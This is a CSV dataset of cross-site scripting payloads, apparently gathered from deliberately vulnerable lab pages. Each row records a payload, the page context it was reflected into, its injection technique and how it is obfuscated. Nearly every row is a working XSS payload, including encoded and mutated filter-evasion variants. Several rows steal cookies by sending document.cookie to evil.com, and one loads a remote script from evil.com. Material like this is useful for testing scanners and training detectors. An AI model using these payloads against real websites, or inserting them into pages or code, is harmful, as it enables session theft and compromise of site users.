payload,payload_with_context,context,severity,source,sink,reflection_position,technique
alert(String.fromCharCode(88))</SCRIPT>,alert(String.fromCharCode(88))</SCRIPT> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:alert(String.from],tag_injection,high,,,attribute,encoding
<img src/onerror=alert(1)>,"<img src/onerror=alert(1)> [position:dom snippet_context:Congratulations, you executed an alert:

1

You can now advance to the next level.]",tag_injection,medium,,,dom,none
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,low,,,script,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:style],event_handler,medium,,,style,original
oNlOaD='ALERt(1)',"oNlOaD='ALERt(1)' [position:html_body snippet_context:...title=""Delete this comment"">✕</button> </form> </div> <div>oNlOaD='ALERt(1)'</div> </div> <div cl]",tag_injection,medium,,,html_body,mutated
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],event_handler,high,,,script,original
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in) [position:script],js_uri,high,,,script,obfuscated:unicode_escape
"<embed src
=""javascript:alert(	1)"">","<embed src
=""javascript:alert(	1)""> [position:script]",tag_injection,low,,,script,obfuscated:tab_newline_inject
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:script],event_handler,low,,,script,original
%3Cimg/src=%3Dx+onload=alert(2)%3D,"%3Cimg/src=%3Dx+onload=alert(2)%3D [position:attribute snippet_context:...<h2>Page Preview</h2> <form style=""margin-bottom:1rem""><input name=""src"" value=""%3Cimg/src=%3Dx+o]",tag_injection,medium,,,attribute,url_encoding
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:attribute]",attribute_escape,low,,,attribute,mutated
onerror='alert(1)',onerror='alert(1)' [position:html_body],tag_injection,medium,,,html_body,none
${alert(1)},${alert(1)} [position:attribute],attribute_escape,low,,,attribute,original
"""><img src
=x onerror
=alert(	1)>","""><img src
=x onerror
=alert(	1)> [position:attribute]",attribute_escape,low,,,attribute,obfuscated:tab_newline_inject
""" onerror=alert()1 a=""",""" onerror=alert()1 a="" [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>"" onerror=alert()]",attribute_escape,medium,,,attribute,none
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--","confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid confirm(String.fr]",tag_injection,high,,,attribute,encoding
"%20""><svg onload=alert(1)>","%20""><svg onload=alert(1)> [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '%20""><svg onload=]",tag_injection,medium,,,script,url_encoding
""">< svg onload=alert(1)>",""">< svg onload=alert(1)> [position:html_body snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user="""">< svg onload=alert(1)>""]",attribute_escape,medium,,,html_body,mutated
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>","""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">""><img src=x onerror=]",tag_injection,high,,,html_body,encoding
< svg onload=alert()>,< svg onload=alert()> [position:html_body],tag_injection,medium,,,html_body,mutated
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],tag_injection,medium,,,html_body,original
"""><svg onload=prompt`1`>","""><svg onload=prompt`1`> [position:dom]",tag_injection,medium,,,dom,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:script]",attribute_escape,medium,,,script,original
"""\x3e\x3cimg src=x onerror=alert(1)\x3e","""\x3e\x3cimg src=x onerror=alert(1)\x3e [position:attribute]",attribute_escape,high,,,attribute,obfuscated:hex_escape
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,medium,,,html_body,original
confirm(),"confirm() [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=confirm()""> <link rel=""stylesh]",tag_injection,medium,,,attribute,none
‘ onmouseover=’alert(1)’,"‘ onmouseover=’alert(1)’ [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""‘ onmouseover=’alert(1)’"">]",tag_injection,medium,,,attribute,none
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:script],tag_injection,high,,,script,obfuscated:unicode_escape
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute_escape,high,,,attribute,original
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:script],event_handler,high,,,script,original
{{7*7}},{{7*7}} [position:none],template_injection,medium,,,none,obfuscated:html_entity
<BODY ONLOAD=alert(‘XSS’)>,"<BODY ONLOAD=alert(‘XSS’)> [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""<BODY ONLOAD=aler]",tag_injection,medium,,,attribute,case_variation
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color://"";alert(String.]",attribute_escape,high,,,attribute,encoding
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:comment snippet_context:...le=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:content=innerHTML=locatio]",tag_injection,high,,,comment,none
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",tag_injection,medium,,,script,original
onerror=alert(0);>,onerror=alert(0);> [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'onerror=alert(0);],tag_injection,medium,,,script,none
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
嘼img src=1 onerror=self.alert(1)嘾,嘼img src=1 onerror=self.alert(1)嘾 [position:attribute],attribute_escape,medium,,,attribute,mutated
"onsearch=""alert(1)""","onsearch=""alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
onload='alert(1)',"onload='alert(1)' [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">onload='alert(1)']",tag_injection,medium,,,attribute,none
{{7*7}},{{7*7}} [position:none],js_uri,high,,,none,original
;alert(1);,";alert(1); [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:;alert(1);;paddin]",tag_injection,medium,,,attribute,none
alert(String.fromCharCode(88))</SCRIPT>,"alert(String.fromCharCode(88))</SCRIPT> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=alert(String.fromCharCode(88))]",tag_injection,high,,,attribute,encoding
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">//"";alert(String.]",tag_injection,high,,,attribute,encoding
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:script]",script_injection,medium,,,script,mutated
"vbscript:prompt(1)#{""action"":1}","vbscript:prompt(1)#{""action"":1} [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'vbscript:prompt(1]",script_injection,medium,,,script,none
""" onerror=confirm(1) x=""",""" onerror=confirm(1) x="" [position:attribute]",attribute_escape,low,,,attribute,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute_escape,low,,,attribute,mutated
<svgonload=alert(1)>,"<svgonload=alert(1)> [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong><svg onload = ale]",attribute_escape,medium,,,attribute,none
<svg onload=alert()>,<svg onload=alert()> [position:dom],tag_injection,medium,,,dom,none
"\x3cembed src=""javascript:alert(1)""\x3e","\x3cembed src=""javascript:alert(1)""\x3e [position:html_body]",tag_injection,medium,,,html_body,obfuscated:hex_escape
"document.write(""&lt;img src=x onerror=alert(1)&gt;"")","document.write(""&lt;img src=x onerror=alert(1)&gt;"") [position:style]",attribute_escape,low,,,style,obfuscated:html_entity
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0""><BODY ONLOAD=aler]",tag_injection,medium,,,attribute,case_variation
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],attribute_escape,high,,,attribute,original
javascript:confirm(1)//,javascript:confirm(1)// [position:attribute],js_uri,medium,,,attribute,none
<body onload=alert(1)>,<body onload=alert(1)> [position:attribute],event_handler,low,,,attribute,original
JavaSCript:alert(123),"JavaSCript:alert(123) [position:attribute snippet_context:...iv> <div style=""margin-top:.75rem;font-size:.875rem""> 🔗 <a href=""JavaSCript:alert(123)"" style=""co]",js_uri,medium,,,attribute,none
\x3cdetails open ontoggle=alert(1)\x3e,\x3cdetails open ontoggle=alert(1)\x3e [position:html_body],js_uri,high,,,html_body,obfuscated:hex_escape
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7""><BODY ONLOAD=alert(88]",tag_injection,medium,,,html_body,case_variation
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e","\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e [position:html_body]",js_uri,medium,,,html_body,obfuscated:hex_escape
""">< svg onload=alert()>",""">< svg onload=alert()> [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)"">"">< svg onload=alert()></div>]",tag_injection,medium,,,html_body,mutated
\x3cimg/src=x onerror=alert(1)//\x3e,\x3cimg/src=x onerror=alert(1)//\x3e [position:attribute],attribute_escape,low,,,attribute,obfuscated:hex_escape
<script>prompt(1)</script>,<script>prompt(1)</script> [position:script],dom_sink,low,,,script,original
<svg////////onload=alert(1)>,"<svg////////onload=alert(1)> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('<svg////////onloa]",tag_injection,medium,,,attribute,none
"<vIdeO	><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">","<vIdeO	><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])""> [position:html_body]",tag_injection,high,,,html_body,mutated
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div><svg onload=""confirm(7)""]",tag_injection,medium,,,html_body,none
"mrco24""type=image src onerror=""alert(1)""","mrco24""type=image src onerror=""alert(1)"" [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""mrco24""type=image]",tag_injection,medium,,,attribute,none
onerror='alert(1)',onerror='alert(1)' [position:html_body],tag_injection,medium,,,html_body,none
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:script],script_injection,medium,,,script,original
onerror='alert(1)',"onerror='alert(1)' [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""onerror='alert(1)]",tag_injection,medium,,,script,none
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:html_body],event_handler,low,,,html_body,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:html_body]",template_injection,high,,,html_body,obfuscated:hex_escape
<SCRIPT>confirm(1)</SCRIPT>,<SCRIPT>confirm(1)</SCRIPT> [position:attribute],template_injection,high,,,attribute,mutated
{{7*7}},{{7*7}} [position:script],script_injection,medium,,,script,original
%3Cx onxxx=alert(1),"%3Cx onxxx=alert(1) [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""%3Cx onxxx=alert(1)"">Next ]",tag_injection,medium,,,attribute,url_encoding
javascript:alert(document.domain),javascript:alert(document.domain) [position:html_body],script_injection,medium,,,html_body,original
"""><svg onload=alert()>","""><svg onload=alert()> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:""><svg onload=ale]",tag_injection,medium,,,attribute,none
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid ""></SCRIPT>”>’><S]",tag_injection,high,,,attribute,encoding|case_variation
""" onerror
=alert(	1) x
=""",""" onerror
=alert(	1) x
="" [position:attribute]",attribute_escape,medium,,,attribute,obfuscated:tab_newline_inject
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:html_body]",event_handler,medium,,,html_body,original
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:attribute],event_handler,high,,,attribute,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,high,,,html_body,original
{{_Vue.h.constructor`confirm`1``()}},"{{_Vue.h.constructor`confirm`1``()}} [position:attribute snippet_context:.../level4.png"" /> <br> <img src=""/static/loading.gif"" onload=""startTimer('{{_Vue.h.constructor`conf]",js_uri,medium,,,attribute,mutated
